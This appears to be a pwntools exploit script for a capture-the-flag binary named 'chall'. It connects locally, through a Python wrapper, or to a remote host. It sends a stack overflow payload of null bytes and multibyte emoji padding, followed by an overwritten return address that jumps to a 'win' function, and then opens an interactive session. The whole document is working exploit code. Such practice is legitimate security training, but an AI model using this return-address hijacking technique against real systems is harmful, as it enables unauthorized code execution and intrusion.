#!/usr/bin/env python3

from pwn import *
import sys

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = 'debug'
gs = '''
b*0x4011D5
b*0x4011C3
b*0x401256
'''
def init():
    if args.LOCAL:
        p = exe.process()
        gdb.attach(p, gdbscript=gs)
    if args.PYTHON:
        p = process(["python3", "./wrapper.py"])
        # pause()
        # gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])    

    return p

p = init()
p.recvuntil(b"Enter your input (max 255 bytes): ")
win = p64(0x401262+8)
payload = flat(
    b"\00"*4,
    "💣"*0x45,
    win,
)
p.sendline(payload)
# p.sendlineafter(b"A", payload)
p.interactive()